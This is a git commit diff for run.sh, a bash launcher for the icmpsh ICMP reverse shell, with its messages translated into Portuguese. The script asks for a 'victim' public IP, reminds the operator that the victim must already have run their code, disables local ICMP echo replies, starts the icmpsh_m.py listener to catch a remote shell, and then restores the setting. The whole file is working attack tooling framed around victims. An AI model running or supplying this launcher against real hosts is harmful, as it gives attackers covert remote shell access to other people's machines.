132a27c0be4d9bb1f840d87bd8c00e949b76368c
Phelps <phelpsmemo@gmail.com>
2016-05-01 10:41:24 -0300

    Update run.sh
    Traduzindo o codigo para PT-BR

--- run.sh
+++ run.sh
@@ -1,14 +1,12 @@
 #!/usr/bin/env bash
 # icmp shell script
-# Daniel Compton
-# 05/2013
+# Forked by Daniel Compton
 echo ""
 echo ""
 echo -e "\e[00;32m##################################################################\e[00m"
 echo ""
-echo "ICMP Shell Automation Script for"
+echo "Script para exeuçao do Shell ICMP"
 echo ""
-echo "https://github.com/inquisb/icmpsh"
 echo ""
 echo -e "\e[00;32m##################################################################\e[00m"
 
@@ -16,27 +14,30 @@ echo ""
 IPINT=$(ifconfig | grep "eth" | cut -d " " -f 1 | head -1)
 IP=$(ifconfig "$IPINT" |grep "inet addr:" |cut -d ":" -f 2 |awk '{ print $1 }')
 echo -e "\e[1;31m-------------------------------------------------------------------\e[00m"
-echo -e "\e[01;31m[?]\e[00m What is the victims public IP address?"
+echo -e "\e[01;31m[?]\e[00m Insira o IP publico de sua vitima"
 echo -e "\e[1;31m-------------------------------------------------------------------\e[00m"
 read VICTIM
+echo "Se certifique que a vitima executou seu codigo"
+echo -e "\e[01;32m++++++++++++++++++++++++++++++++++++++++++++++++++\e[00m"
+echo ""
 LOCALICMP=$(cat /proc/sys/net/ipv4/icmp_echo_ignore_all)
 if [ "$LOCALICMP" -eq 0 ]
                 then 
                                 echo ""
-                                echo -e "\e[01;32m[-]\e[00m Local ICMP Replies are currently enabled, I will disable these temporarily now"
+                                echo -e "\e[01;32m[-]\e[00m O sistema de reply icmp local deve estar ligado"
                                 sysctl -w net.ipv4.icmp_echo_ignore_all=1 >/dev/null
                                 ICMPDIS="disabled"
                 else
                                 echo ""
 fi
 echo ""
-echo -e "\e[01;32m[-]\e[00m Launching Listener...,waiting for a inbound connection.."
+echo -e "\e[01;32m[-]\e[00m Esperando pedidos de conexao"
 echo ""
 python icmpsh_m.py "$IP" "$VICTIM"
 if [ "$ICMPDIS" = "disabled" ]
                 then
                                 echo ""
-                                echo -e "\e[01;32m[-]\e[00m Enabling Local ICMP Replies again now"
+                                echo -e "\e[01;32m[-]\e[00m Reativando o ICMP reply local novamente"
                                 sysctl -w net.ipv4.icmp_echo_ignore_all=0 >/dev/null
                                 echo ""
                 else
@@ -44,4 +45,3 @@ if [ "$ICMPDIS" = "disabled" ]
 fi
 
 exit 0
-
